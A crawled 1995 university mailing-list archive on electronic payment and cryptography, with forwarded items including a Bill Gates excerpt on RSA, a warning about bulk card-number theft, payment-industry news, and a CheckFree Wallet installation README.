Boston at the Fed. However other groups would like to deal with the other issues is up to them. FSTC will find a way to work with this committee through their joint membership. Tom asked Frank to feed back to X9 how FSTC wants to fit Echeck into this work group. All this work item was written to deal with is the syntax, we are not going to deal with the protocol. There would be a multiplicity of protocols that would use it, phone, modem, http. SEPP has an application protocol that is independent of communications. Mohammad Khan volunteered to lead a group to discuss management issues including negotiation. VISA, MC, Discover, IBM, and Cybercash volunteered to participate in that group. ----------- End Forwarded Message ----------- Next message: Dave Farber: "IP: INTERNET SECURITY RISKS FOR CONSUMERS OVERBLOWN" Previous message: Dave Farber: "How to steal ecash (was: Questions/Comments on ecash protocol)"WT02-B11-119IA086-000622-B010-50http://res2.resnet.upenn.edu:80/hypermail/cis899/0141.html 130.91.195.242 19970122041710 text/html 19617HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:16:58 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 19445Last-modified: Tue, 05 Dec 1995 06:50:54 GMT Daily Chat on CIS899: IP: Gates: Jiffy Iffy Crypto IP: Gates: Jiffy Iffy Crypto Dave Farber (farber@central.cis.upenn.edu) Mon, 04 Dec 1995 15:30:21 -0500 Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: Dave Farber: "IP: 2nd International Cryptogrpahy Experiment (ICE) [worth" Previous message: Dave Farber: "IP: INTERNET SECURITY RISKS FOR CONSUMERS OVERBLOWN"Date: Sat, 25 Nov 1995 16:06:40 +0100 To: cypherpunks@toad.com From: nobody@replay.com (Anonymous) >From "The Road Ahead," by Bill Gates, with Nathan Myhrvold and Peter Rinearson, Viking, 1995. [Paths to the Highway, pp. 106-111] Governments have long understood the importance of keeping information private, for both economic and military reasons. The need to make personal, commercial, military, or diplomatic messages secure (or to break into them) has attracted powerful intellects through the generations. It is very satisfying to break an encoded message. Charles Babbage, who made dramatic advances in the art of code breaking in the mid-1800s, wrote: "Deciphering is, in my opinion, one of the most fascinating of arts, and I fear I have wasted upon it more time than it deserves." I discovered its fascination as a kid when, like kids everywhere, a bunch of us played with simple ciphers. We would encode messages by substituting one letter of the alphabet for another. If a friend sent me a cipher that began "ULFW NZXX," it would be fairly easy to guess that this represented "DEAR BILL," and that U stood for D, and L for E, and so forth. With those seven letters it wasn't hard to unravel the rest of the cipher fairly quickly. Past wars have been won or lost because the most powerful governments on earth didn't have the cryptological power any interested junior high school student with a personal computer can harness today. Soon any child old enough to use a computer will be able to transmit encoded messages that no government on earth will find easy to decipher. This is one of the profound implications of the spread of fantastic computing power. When you send a message across the information highway it will be "signed" by your computer or other information appliance with a digital signature that only you are capable of applying, and it will be encrypted so that only the intended recipient will be able to decipher it. You'll send a message, which could be information of any kind, including voice, video, or digital money. The recipient will be able to be almost positive that the message is really from you, that it was sent at exactly the indicated time, that it has not been tampered with in the slightest, and that others cannot decipher it. The mechanism that will make this possible is based on mathematical principles, including what are called "one-way functions" and "public-key encryption." These are quite advanced concepts, so I'm only going to touch on them. Keep in mind that regardless of how complicated the system is technically, it will be extremely easy for you to use. You'll just tell your information appliance what you want it to do and it will seem to happen effortlessly. A one-way function is something that is much easier to do than undo. Breaking a pane of glass is a one-way function, but not one useful for encoding. The sort of one-way function required for cryptography is one that is easy to undo if you know an extra piece of information and very diffficult to undo without that information. There are a number of such one-way functions in mathematics. One involves prime numbers. Kids learn about prime numbers in school. A prime number cannot be divided evenly by any number except 1 and itself. Among the first dozen numbers, the primes are 2, 3, 5, 7, and 11. The numbers 4, 6, 8, and 10 are not prime because 2 divides into each of them evenly. The number 9 is not prime because 3 divides into it evenly. There are an infinite number of prime numbers, and there is no known pattern to them except that they are prime. When you multiply two prime numbers together, you get a number that can be divided evenly only by those same two primes. For example, only 5 and 7 can be divided evenly into 35. Finding the primes is called "factoring" the number. It is easy to multiply the prime numbers 11,927 and 20,903 and get the number 249,310,081, but it is much harder to recover from the product, 249,310,081, the two prime numbers that are its factors. This one-way function, the difficulty of factoring numbers, underlies an ingenious kind of cipher: the most sophisticated encryption system in use today. It takes a long time for even the largest computers to factor a really large product back into its constituent primes. A coding system based on factoring uses two different decoding keys, one to encipher a message and a different but related one to decipher. With only the enciphering key, it's easy to encode a message, but deciphering it within any practical period of time is nearly impossible. Deciphering requires a separate key, available only to the intended recipient of the message -- or, rather, to the recipient's computer. The enciphering key is based on the product of two huge prime numbers, whereas the deciphering key is based on the primes themselves. A computer can generate a new pair of unique keys in a flash, because it is easy for a computer to generate two large prime numbers and multiply them together. The enciphering key thus created can be made public without appreciable risk, because of the difficulty even another computer would have factoring it to obtain the deciphering key. The practical application of this encryption will be at the center of the information highway's security system. The world will become quite reliant on this network, so it is important that security be handled competently. You can think of the information highway as a postal network where everyone has a mailbox that is impervious to tampering and has an unbreakable lock. Each mailbox has a slot that lets anyone slide information in, but only the owner of a mailbox has the key to get information out. (Some governments may insist that each mailbox have a second door with a separate key that the government keeps, but we'll ignore that political consideration for now and concentrate on the security that software will provide.) Each user's computer or other information appliance will use prime numbers to generate an enciphering key, which will be listed publicly, and a corresponding deciphering key, which only the user will know. This is how it will work in practice: I have information I want to send you. My information appliance/computer system looks up your public key and uses it to encrypt the information before sending it. No one can read the message, even though your key is public knowledge, because your public key does not contain the information needed for decryption. You receive the message and your computer decrypts it with a private key that corresponds to your public key. You want to answer. Your computer looks up my public key and uses it to encrypt your reply. No one else can read the message, even though it was encrypted with a key that is totally public. Only I can read it because only I have the private deciphering key. This is very practical, because no one has to trade keys in advance. How big do the prime numbers and their products have to be to ensure an effective one-way function? The concept of public-key encryption was invented by Whitfield Diffie and Martin Hellman in 1977. Another set of computer scientists, Ron Rivest, Adi Shamir, and Leonard Adelman, soon came up with the notion of using prime factorization as part of what is now known as the RSA cryptosystem, after the initials of their last names. They projected that it would take millions of years to factor a 130-digit number that was the product of two primes, regardless of how much computing power was brought to bear. To prove the point, they challenged the world to find the two factors in this 129-digit number, known to people in the field as RSA 129: 114,381,625,757,888,867,669,235,779,976,146,612,010, 218,296,721,242,362,562,561,842,935,706,935,245,733, 897,830,597,123,563,958,705,058,989,075,147,599,290, 026,879,543,541 They were sure that a message they had encrypted using the number as the public key would be totally secure forever. But they hadn't anticipated either the full effects of Moore's Law, as discussed in chapter 2, which has made computers much more powerful, or the success of the personal computer, which has dramatically increased the number of computers and computer users in the world. In 1993 a group of more than 600 academics and hobbyists from around the world began an assault on the 129-digit number, using the Internet to coordinate the work of various computers. In less than a year they factored the number into two primes, one 64 digits long and the other 65. The primes are as follows: 3,490,529,510,847,650,949,147,849,619,903,898,133, 417,764,638,493,387,843,990,820,577 and 32,769,132,993,266,709,549,961,988,190,834,461,413, 177,642,967,992,942,539,798,288,533 And the encoded message says: "The magic words are squeamish and ossifrage." One lesson that came out of this challenge is that a 129-digit public key is not long enough if the information being encrypted is really important and sensitive. Another is that no one should get too cocksure about the security of encryption. Increasing the key just a few digits makes it much more difficult to crack. Mathematicians today believe that a 250-digit-long product of two primes would take millions of years to factor with any foreseeable amount of future computing power. But who really knows? This uncertainty -- and the unlikely but conceivable possibility that someone could come up with an easy way of factoring big numbers -- means that a software platform for the information highway will have to be designed in such a way that its encryption scheme can be changed readily. One thing we don't have to worry about is running out of prime numbers, or the prospect of two computers' accidentally using the same numbers as keys. There are far more prime numbers of appropriate length than there are atoms in the universe, so the chance of an accidental duplication is vanishingly small. Key encryption allows more than just privacy. It can also assure the authenticity of a document because a private key can be used to encode a message that only the public key can decode. It works like this: If I have information I want to sign before sending it to you, my computer uses my private key to encipher it. Now the message can be read only if my public key -- which you and everyone else knows -- is used to decipher it. This message is verifiably from me, because no one else has the private key that could have encrypted it in this way. My computer takes this enciphered message and enciphers it again, this time using your public key. Then it sends this double-coded message to you across the information highway. Your computer receives the message and uses your private key to decipher it. This removes the second level of encoding but leaves the level I applied with my private key. Then your computer uses my public key to decipher the message again. Because it really is from me, the message deciphers correctly and you know it is authentic. If even one bit of information was changed, the message would not decode properly and the tampering or communications error would be apparent. This extraordinary security will enable you to transact business with strangers or even people you distrust, because you'll be able to be sure that digital money is valid and signatures and documents are provably authentic. Security can be increased further by having time stamps incorporated into encrypted messages. If anyone tries to tinker with the time that a document supposedly was written or sent, the tinkering will be detectable. This will rehabilitate the evidentiary value of photographs and videos, which has been under assault because digital retouching has become so easy to do. My description of public-key encryption oversimplifies the technical details of the system. For one thing, because it is relatively slow, it will not be the only form of encipherment used on the highway. But publickey encryption will be the way that documents are signed, authenticity is established, and the keys to other kinds of encryption are distributed securely. [Critical Issues, pp. 265-66, 270-71] This versatility will be the strength of the network, but it will also mean we will become reliant on it. Reliance can be dangerous. During the New York City blackouts in 1965 and 1977, millions of people were in trouble -- at least for a few hours -- because of their dependence on electricity. They counted on electric power for light, heat, transport, and security. When electricity failed, people were trapped in elevators, traffic lights stopped working, and electric water pumps quit. Anything really useful is missed when you lose it. A complete failure of the information highway is worth worrying about. Because the system will be thoroughly decentralized, any single outage is unlikely to have a widespread effect. If an individual server fails, it will be replaced and its data restored. But the system could be susceptible to assault. As the system becomes more important, we will have to design in more redundancy. One area of vulnerability is the system's reliance on cryptography -- the mathematical locks that keep information safe. None of the protection systems that exist today, whether steeringwheel locks or steel vaults, are completely fail-safe. The best we can do is make it as difficult as possible for somebody to break in. Despite popular opinions to the contrary, computer security has a very good record. Computers are capable of protecting information in such a way that even the smartest hackers can't get at it readily unless someone entrusted with information makes a mistake. Sloppiness is the main reason computer security gets breached. On the information highway there will be mistakes, and too much information will get passed along. Someone will issue digital concert tickets that prove to be forgeable, and too many people will show up. Whenever this sort of thing happens, the system will have to be reworked and laws may have to be revised. Because both the system's privacy and the security of digital money depend on encryption, a breakthrough in mathematics or computer science that defeats the cryptographic system could be a disaster. The obvious mathematical breakthrough would be development of an easy way to factor large prime numbers. Any person or organization possessing this power could counterfeit money, penetrate any personal, corporate, or governmental file, and possibly even undermine the security of nations, which is why we have to be so careful in designing the system. We have to ensure that if any particular encryption technique proves fallible, there is a way to make an immediate transition to an alternate technique. There's a little bit of inventing still to be done before we have that perfected. It is particularly hard to guarantee security for information you want kept private for a decade or more. [Good section on privacy protection elided] At the same time technology is making it easier to create video records, it is also making it possible to keep all your personal documents and messages totally private. Encryption-technology software, which anyone can download from the Internet, can transform a PC into a virtually unbreakable code machine. As the highway is deployed, security services will be applied to all forms of digital information -- phone calls, files, databases, you name it. As long as you protect the password, the information stored on your computer can be held under the strongest lock and key that has ever existed. This allows for the greatest degree of information privacy any individual has ever had. Many in government are opposed to this encryption capability, because it reduces their ability to gather information. Unfortunately for them, the technology can't be stopped. The National Security Agency is a part of the U.S. government defense and intelligence community that protects this country's secret communications and decrypts foreign communications to gather intelligence data. The NSA does not want software containing advanced encryption capabilities to be sent outside the United States. However, this software is already available throughout the world, and any computer can run it. No policy decision will be able to restore the tapping capabilities governments had in the past. Today's legislation that prevents the export of software with good encryption capability could harm U.S. software and hardware companies. The restrictions give foreign companies an advantage over U.S. competitors. American companies almost unanimously agree that the current encryption export restrictions don't work. ----- Next message: Dave Farber: "IP: 2nd International Cryptogrpahy Experiment (ICE) [worth" Previous message: Dave Farber: "IP: INTERNET SECURITY RISKS FOR CONSUMERS OVERBLOWN"WT02-B11-120IA086-000622-B010-66http://res2.resnet.upenn.edu:80/hypermail/cis899/0138.html 130.91.195.242 19970122041727 text/html 5336HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:17:26 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 5165Last-modified: Tue, 05 Dec 1995 02:41:02 GMT Daily Chat on CIS899: How to steal ecash (was: Questions/Comments on ecash protocol) How to steal ecash (was: Questions/Comments on ecash protocol) Dave Farber (farber@central.cis.upenn.edu) Mon, 04 Dec 1995 14:39:29 -0500 Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: Dave Farber: "Re: Meeting notes from ANSI X.9 Meeting on Electronic Payment" Previous message: Dave Farber: "try http://www.mktmkt.com/ic.html for lot of credit card">Posted-Date: 4 Dec 1995 14:08:33 -0500 >To: cypherpunks@toad.com >Path: not-for-mail >From: iagoldbe@calum.csclub.uwaterloo.ca (Ian Goldberg) >Newsgroups: csc.lists.cypherpunks >Subject: How to steal ecash (was: Questions/Comments on ecash protocol) >Date: 4 Dec 1995 14:08:33 -0500 >Organization: University of Waterloo Computer Science Club >Lines: 40 >Distribution: csc >References: <199512012222.OAA18230@netcom14.netcom.com> <199512030127.RAA03496@cory.EECS.Berkeley.EDU> >Reply-To: iang@cs.berkeley.edu >Sender: owner-cypherpunks@toad.com > >In article <199512030127.RAA03496@cory.EECS.Berkeley.EDU>, >Ian Goldberg <iang@cory.EECS.Berkeley.EDU> wrote: >>Since the payer_code is not supposed to be sent around, how is it sent to >>the bank in order to cancel a payment?

Sure, if you wanted to steal a card number or two the ground around a gas-station would probably be a good choice. However, if you wanted to steal a thousand card numbers (or maybe even thirty thousand), just sniff packets off a hub near a large Web site that accepts unencrypted (or weakly encrypted) card transactions or hack your favorite ISP's machines. It really bothers me that officers at companies writing net commerce software are regularly quoted in the trade rags comparing the relatively little risk of a single net card transaction vs. a transaction at a restaraunt or gas station. We aren't talking about a crooked clerk who handles at most a few hundred cards per day or an unlocked dumpster with maybe the same number of carbons in it. We are talking about potentially hundreds of thousands of card numbers whizzing through a single point that could be easily (and undetectably) monitored and recorded with off-the-shelf-equipment for later analysis. Even if the transactions are encrypted, a single exploitable weakness discovered after widespread deployment could compromise massive numbers of cards. The stakes are much higher and this will invite much more sophisticated crooks to attempt to defraud the system. andrew Next message: Dave Farber: "IP: Gates: Jiffy Iffy Crypto" Previous message: Dave Farber: "Re: Meeting notes from ANSI X.9 Meeting on Electronic Payment"WT02-B11-122IA086-000622-B010-116http://res2.resnet.upenn.edu:80/hypermail/cis899/0144.html 130.91.195.242 19970122041755 text/html 3139HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:17:56 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 2968Last-modified: Tue, 05 Dec 1995 10:43:33 GMT Daily Chat on CIS899: IP: Java Cup International -- $1,000,000 in prizes IP: Java Cup International -- $1,000,000 in prizes Dave Farber (farber@central.cis.upenn.edu) Sun, 03 Dec 1995 22:20:08 -0500 Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: Dave Farber: "reminder Prof Faulhaber of Wharton and his class will join us" Previous message: Dave Farber: "IP: Sixth Conference on Computers, Freedom, and Privacy"Date: Sun, 03 Dec 1995 18:56:34 -0800 From: John Gilmore <gnu@toad.com> [Wouldn't it be fun to win an UltraSPARC for writing some free code to secure Java applications?

CFP96 is hosted by MIT and by the World Wide Web Consortium. Since its inception in 1991, the series of CFP conferences has brought together experts and advocates from the fields of computer science, law, business, public policy, law enforcement, government, and many other areas to explore how computer and telecommunications technologies are affecting freedom and privacy. Registration for CFP96 will open on December 8. Conference attendance will be limited. Due to the enormous public interest in CFP issues over the past year, we encourage you to register early. SPECIAL NOTE TO STUDENTS: There are a limited number of places available at a special student rate. These will be allotted on a first-come first-served basis, so register as soon as possible. Events planned for this year's conference include: - Federal prosecutors square off against civil-liberties lawyers in a mock Supreme Court test of the "Cryptography Control Act of 1996", which criminalizes non-escrowed encryption. - Authors Pat Cadigan, Tom Maddox, Bruce Sterling, and Vernor Vinge divine the future of privacy. - College administrators, students, lawyers, and journalists role-play scenarios that plumb the limits of on-line expression on campus networks. - Panels on international issues in privacy and encryption; on the struggle to control controversial content on the Internet; on tensions between copyright of digital information and freedom of expression; on threats posed by electronic money to law enforcement, privacy, and freedom; on mass communication versus mass media. You can register for CFP96, starting December 8, by US Mail, by fax, or via the World Wide Web.

Money: Back to the Future? By Walter Wriston (Former chairman of Citicorp) Americans are about to begin using a new kind of money that may have consequences for the Federal Reserve's control of the money supply and almost certainly for the velocity of money. Over the years, people have used all kinds of things for money, from the huge immovable stones in the front yards of the residents of Yap Island to the more familiar silver and gold. All these various mediums of exchange will now be joined in our country by the "smart" card -- a piece of plastic embedded with a microchip. Smart cards combine features of the following: automatic teller machine cards that let you access your bank account and draw cash; MasterCard or Visa cards that permit you to buy now and pay later; and debit cards that charge an account at the time of purchase. Not only can smart cards do all of the above but they can also serve as an "electronic purse" independent of your bank account. These cards contain real money that can be spent at stores and restaurants. In effect, the card is an electronic traveler's check, but one that makes exact change. In addition, the integrated circuit chip allows a higher degree of security for the information stored than do the current magnetic strip cards. Smart cards are common in Europe and Asia, where some 400 million were shipped last year. The first large-scale use of smart cards in this country will occur next year at the Summer Olympics in Atlanta. Plans call for 300,000 rechargeable cards, and 700,000 disposable cards in denominations of $25, $50 and $100. These cards would fit nicely into the payment habits of Americans, since in the U.S. it is estimated that 88% of transactions are done by cash or check, and of these 83% are for less than $10. In Atlanta, electronic "purse cards," which contain stored value, could be spent at pay phones or vending machines. When their stored value is exhausted, they are thrown away. The smart cards, by contrast, can be taken back to the issuer and recharged. Their broad issuance and use could return America to something very close to the free banking of the last century, when every commercial bank issued dollar bills, backed sometimes by the skill of the management, sometimes by doubtful state bonds and sometimes by gold or silver. We have grown so accustomed to the familiar Federal Reserve note that many forget that Americans had no central bank for about 75 years -- from 1836, when President Jackson vetoed the bill to renew the charter of the Second Bank of the United States, to the start of World War I, when the Federal Reserve Act was passed. After the passage by New York state of the Free Banking Act in 1838, the idea of state-chartered banks spread across the country, and each commercial bank issued its own dollar bills of various shapes and sizes. This does not mean that the 19th century witnessed complete currency chaos. In 1863, the National Bank Act was passed to create a market in the government bonds needed to finance the Civil War and to bring some order to the private issuance of currency. The act required that bank notes issued by commercial banks be uniform in appearance and that they be backed by collateral consisting of U.S. Treasury securities. As the old Civil War bonds were paid off, the currency base of the country declined some 60% from 1881 to 1890. This inflexible system led to panics and instability. To a certain extent, the Treasury Department during this time assumed some of the functions of a central bank. All during this period a debate raged, not about whether America needed a central bank but about "free silver" and the price at which the Treasury would buy gold and silver. It was not until the eve of World War I that passage of the Federal Reserve Act finally gave the U.S. government a monopoly on the creation of money. Now we may be going back to the future. The advent of smart cards means that the Fed will lose its monopoly on issuing currency, except that this time the new money will be issued not only by banks but by all kinds of companies, from convenience stores to telephone companies. Nor is this the only trend threatening the Fed's monopoly: Information technology is about to permit the creation of both electronic token money and cash money in cyberspace. Already we have Digi Cash in Amsterdam reviving in modern guise something very close to the old American free-banking system -- issuing electronic money (backed by some depository bank holding collateral in the form of Treasury securities) and performing the clearing function. None of this is necessarily a cause for panic. There is very little, if any, evidence that government has managed our currency values any better than the commercial banks did in pre-Fed days. Indeed, the Nobel laureate economist F.A. Hayek put it more strongly: "The history of government management of money has, except for a few short happy periods, been one of incessant fraud and deception." Still these new trends do present worries for central bankers. If more and more firms issue cards for cash or credit, what will be the effect on the velocity of money? How will central banks form policies on the control of the money supply if any company can issue electronic purse cards on credit, with or without collateral? What will happen if the issuer of the card goes broke? As smart cards become more visible in America, regulators and governments will begin to wonder about control of money and credit. The Eulopean system of central banks has produced an advisory report outlining a possible regulatory response, and in this countly some Fed officials are starting to wonder if their regulations will be applicable. If one definition of money is an object that has no use except to be given to someone else in exchange for goods or services, smart cards are money -- and they are coming to your neighborhood soon. ----- Next message: Dave Farber: "Guest speaker on Thursday" Previous message: Dave Farber: "Future"WT02-B11-130IA087-000625-B033-6http://res2.resnet.upenn.edu:80/hypermail/cis899/0131.html 130.91.195.242 19970122042024 text/html 1704HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 04:20:27 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 1533Last-modified: Sat, 25 Nov 1995 04:05:19 GMT Daily Chat on CIS899: Future Future Dave Farber (farber@central.cis.upenn.edu) Mon, 20 Nov 1995 21:18:53 -0500 Messages sorted by: [ date ][ thread ][ subject ][ author ] Next message: Dave Farber: "IP: Money: Back to the Future?"

The service, targeted for the multimedia portion of the Internet known as the World Wide Web, would be filled with information and games born from Sony's vast array of movies, music and entertainment. The on-line fare could be purchased with Visa credit cards, 400 million of which are used world-wide. Dubbed Sony Station, the site would include new programming produced for the on-line environment when it launches in April. "It would be wrong to think of this as an alternative delivery system," said Michael P. Schulhof, president and chief executive officer of Sony Corp. of America. "We will develop a host of new services drawing from all of the creative talent from all of our operating units," which include Sony Television Entertainment, Sony Music Entertainment and Sony Pictures Entertainment, he said. The move underscores the intention of big media companies to cut out the middlemen of commercial on-line services and take control of their own electronic services on the Internet's World Wide Web. America Online Inc., the largest commercial on-line service, reaches four million users, while the Web, according to a recent survey, has 24 million users in North America. A Web-based service, said Sony's Mr. Schulhof, "reaches a much larger audience." Sony executives shied away from details, but they said the site would be rendered in three-dimensional "space." Users could "enter" various "pavilions" to play, for example, an on-line game of "Wheel of Fortune" or "Jeopardy!" Winners might use their Visa cards to purchase their discounted prizes. Users also may be able to tap into behind-the-scenes information about "Seinfeld" and soap operas such as "The Young and the Restless," or "chat" on-line with stars of a new on-line soap opera that might be offered on a pay-per-view basis. They may eventually be able to download new songs from unreleased albums from the likes of Michael Jackson and Barbra Streisand. But marketing a Web site amid the flood of new Web sites is increasingly difficult. Sony and Visa face fierce competition from major media concerns and individual users who already offer their own database of anything relating to "Seinfeld," for example. Moreover, the companies have to overcome the overwhelming fear in the marketplace that the Internet is no place for passing credit-card data. People "don't have to worry about some hacker coming in and ripping off their credit-card number," vowed Todd Chaffee, a senior vice president at Visa, which is leading one of the biggest industry efforts to develop secure on-line payment systems for the Internet. Industry watchers said the two companies, with their consumer and financial expertise, could significantly step up the consumer realm of electronic commerce. Consumers are "looking for familiar names that they trust, and Sony and Visa are names that fall into that category," said Gary Arlen, president of research firm Arlen Communications Inc. Executives close to the companies said that Visa and Sony are investing more than $20 million in the service in the next "several years."

JOINS AD INDUSTRY'S INTERACTIVE ALLIANCE; SAYS ITS CLICKSHARE SYSTEM WILL SUPPORT "CASIE" GUIDELINES WILLIAMSTOWN, Mass., Nov. 13 -- Newshare Corp., developer of the Clickshare tracking and transaction system, said Monday it had joined the Interactive Alliance, an advertising-industry consortium developing Internet audience-measurement standards. The company also said it will support privacy and other guidelines contained in an industry white paper developed by the Coalition for Advertising Supported Information and Entertainment (CASIE). CASIE's members control the majority of the $150 billion U.S. advertising market. "The addition of Clickshare adds strength to The Interactive Alliance," said Marshall L. Snyder, executive vice president, Arbitron NewMedia and an alliance founder. "Their business proposition has the potential to generate large numbers of identified web users." Newshare Corp. is alpha-testing its Clickshare system, which enables Internet publishers to cooperate in generating and sharing content revenues. The absence of a micro- transaction information standard has prevented many publishers from using the World Wide Web so far. Under Clickshare, each consumer chooses a most-trusted publisher to whom to identify himself/herself and Clickshare will never see the names. That publisher and user determine how the user's name and demographic information may be used. Simplifying information access Clickshare enables the anonymous tracking of individual users as they jump among unrelated Internet sites, and offers a facility to settle information transactions down to as little as 10 cents. Clickshare requires no special user software and simplifies user access to information by rendering multiple registration at Web sites unnecessary. "The Interactive Alliance has already brought together so much of the industry in acknowledging common principles, it will make our job easier to bring about publisher cooperation," said Bill Densmore, Newshare's president. "And the CASIE working group principles strike a laudable balance among marketing requirements for a user census, the consumer's need for ease-of-use and democracy's need to assure personal privacy." CASIE is a joint project of the Association of National Advertisers and the American Association of Advertising Agencies with the support of the Advertising Research Foundation. It seeks to define a universal standard for third- party verification of audience claims by Web publishers which gathers uniform usage data about individual users, while respecting their privacy. "Audience measurement efforts which adhere to the CASIE principles should help grow interactive media and benefit all those involved, including advertisers, media buyers and sellers," said Judy Black, senior partner and director of the BJK&E Interactive Group and also the chair of the CASIE research subcommittee. What is the Alliance? The Interactive Alliance is working to assemble the most comprehensive and definitive ongoing database on worldwide interactive media use. It was formed in 1995 by Next Century Media Inc., and The Arbitron Company. Other consortium members, in addition to Newshare Corp., now include Interse, McCollum Spielman Worldwide and MarketCast. The Audit Bureau of Circulations and its technical support affiliate, WebTrack, have agreed to be participants in the work of The Alliance. Representatives of over 40 other industry organizations have agreed to participate as alliance advisors. "Clickshare and The Interactive Alliance share a philosophy of cooperatively lifting the Interactive lake to raise all ships," noted Bill Harvey, president and CEO, Next Century Media. "It turns out that the Internet, which arose like topsy with no central direction, can become a more valuable business for content providers and advertisers by the same process of decentralized collaboration." The advertising and publishing industries are struggling to reach a technology and consensus for the measurement and tracking of World Wide Web usage. The Newspaper Association of America has convened a Nov. 14 summit in Dallas so that major publishers and system vendors can discuss audience measurement principles. Newshare is among invited participants in the summit. About the participants Newshare Corp. was founded in September 1994 by a veteran publisher, a university technologist and a marketing executive as the Internet's first news brokerage, with a goal of building a free market for digital information among independent publishers and their users. Its first product is Clickshare. Williamstown, Mass.-based Newshare is privately funded. Next Century Media is a team of advertising and media-research executives committed to maximizing the effectiveness of Interactive media worldwide for advertisers, agencies, network operators, content providers and consumers. Next Century Media clients include advertisers and agencies collectively representing over $23 billion in annual advertising investments, plus a large number of network operators. Arbitron NewMedia, a unit of the Arbitron Company, was established in 1994 to provide a wide range of survey research, consulting and methodological services to the cable, telecommunications, direct broadcast satellite, online and new media industries. The Arbitron Company is a media information firm providing services to broadcasters, advertisers and agencies. The Arbitron Company is a division of Ceridian Corp.

We are aware that early releases of a software program may be confusing or may not operate as expected. If you have any problems or comments, we would like to hear from you. Installation *************************************************** CheckFree Wallet software is provided free of charge. You can download CheckFree Wallet software and/or software updates from the CheckFree home page (http://www.checkfree.com) or from many merchant home pages while you shop. When you download and run the WINCYBER.EXE self-extracting archive routine, six files are copied to your computer. These files are used by the setup application during the installation of CheckFree Wallet. If you receive CheckFree Wallet on a diskette rather than by downloading, you will not have a self-extracting archive routine. Instead, all of the files necessary for installation have already been extracted and are ready for use on the diskette. Follow these instructions to install CheckFree Wallet: Before You Install 1. Back-up your CheckFree Wallet software 2. If you are upgrading existing Wallet software, back-up your data files 3. Be sure you have at least 2 MB hard disk space free 4. Turn off any virus protection programs, they may interfere with the installation 5. Quit any open applications 6. If you receive CheckFree Wallet on a diskette, proceed directly to step 10 in the next section, Installing CheckFree Wallet. If you downloaded CheckFree Wallet, continue with steps 7 - 9 below. 7. Create a temporary directory: MKDIR C:\TEMP This README file will use C:\TEMP as an example 8. Copy the self-extracting archive, WINCYBER.EXE, to the temporary directory 9. Run WINCYBER.EXE to extract the installation files to your computer Users who are installing CheckFree Wallet as an upgrade or in place of other Wallet applications (CompuServe Wallet with CheckFree or CyberCash Wallet) will need to make a small modification to the .INI file(s) of their Web browser(s). All of these Wallet applications share a common entry in browser .INI files. Before running the SETUP application, delete all lines that contain "CYBER" from the browser .INI file(s). This deletion will enable the SETUP application to make the modifications necessary to run CheckFree Wallet. Installing CheckFree Wallet 10. Return to Windows (or launch Windows) and type one of the following commands in the Windows File/Run dialog box: If you received CheckFree Wallet on a diskette, type A:\SETUP where A:\ is the name of the drive where you have placed the CheckFree Wallet diskette. OR If you downloaded CheckFree Wallet, type C:\TEMP\SETUP where C:\TEMP is the name of the directory where you have extracted the CheckFree Wallet files. This launches a typical Windows setup routine that installs CheckFree Wallet and links it to your Web browser. The setup routine presents a dialog box asking for the directory where CheckFree Wallet will be installed. This directory is different than the temporary directory used to download and extract the files. 11. Click OK to accept the default directory (CFWALLET), where CheckFree Wallet files will be installed, or type a different directory name. If the specified directory does not exist, it will be created at this time. CheckFree Wallet automatically searches your computer for any installed Web browsers and asks if these browsers should be linked to CheckFree Wallet. A dialog box is displayed asking to link CheckFree Wallet to browsers. 12. Click Yes to automatically modify the browser .INI file(s). This allows the browser(s) to recognize CheckFree Wallet. If more than one browser is installed on your computer, you must respond Yes or No to the prompt for each browser. Additional Web browsers may be linked to CheckFree Wallet at a later time. Simply use the Web Browser function located in the Miscellaneous area of the Wallet Administration menu to link other browsers. Details are given in a later section of this file. When CheckFree Wallet is installed, a new program group called CheckFree Wallet is created. This contains an icon for CheckFree Wallet program and a Notepad icon for this README file. A dialog box appears telling you that a wallet persona containing your credit card information must be created before you can use CheckFree Wallet to make purchases. Creating a New Persona ***************************************** Before you can use CheckFree Wallet, you must enter critical information such as a unique Wallet ID, a password, and other information specific to online security. This information (called a persona) identifies you as the legitimate bearer of the credit information, and is stored on your computer using an RSA public/private key encryption method. Your persona is entered in the system only once. A persona can be thought of as an individual wallet. Using personas, you have the ability to create multiple wallets on one computer. You can create one persona for yourself and others for a spouse, friend, child, etc. When you enter your credit card information it is linked to your persona. This information is securely encrypted and transmitted to CheckFree for confirmation with the bank that issued the card. To enter a persona: 13. At the New Persona dialog box, click New to enter your wallet persona. If you do not wish to enter your persona at this time, you can access CheckFree Wallet Administration dialog box later by double-clicking the CheckFree Wallet icon on your desktop. When you click New, your Web browser initiates a communications test and attempts to communicate with the CheckFree server on the Internet. In order for this communications test to occur, you must be online and have an active connection to your Internet service provider. 14. When communications are successful, a Wallet software licensing screen appears. Please read and understand the license agreement before clicking "I Agree" to continue. If you do not wish to agree to the licensing terms, click "I Do Not Agree" to exit the installation routine. 15. At the CheckFree Wallet Persona Information dialog box, enter an ID that will be used with your Wallet. This ID must be at least 6 characters long (example: John Doe). 16. Enter your Internet e-mail address. 17. Select the language you wish to use with CheckFree Wallet. English is the only selection available at this time. 18. Click OK to continue to the Password dialog box. 19. Enter a password in the first field, then press Tab and enter the same password (for confirmation) in the next field. CheckFree Wallet automatically generates unique security keys that will ensure that your wallet persona information is completely secure. When your security keys are generated, a dialog box appears prompting you to store copies of these keys. For security purposes, you should store the copies on floppy diskettes rather than your hard drive. 20. Identify the disk location for security key storage, and click OK. When the keys have been backed up to the selected location, remove the floppy diskette and store the copy in a safe place. The Link Credit Card dialog box appears, and you are now ready to enter credit card information. Press the Tab key or use the mouse to move from field to field. The Link screen contains all the information needed for you to pay for purchases with a credit card using CheckFree Wallet. Be sure to complete each field correctly. As you fill out this screen, online help is available by clicking the Help button at the bottom of the screen. In the Credit Card section: 21. Enter your credit card number. A graphic representing the credit card type (Visa, MasterCard, etc.) appears based on the first four digits of the credit card number, and its name is selected in 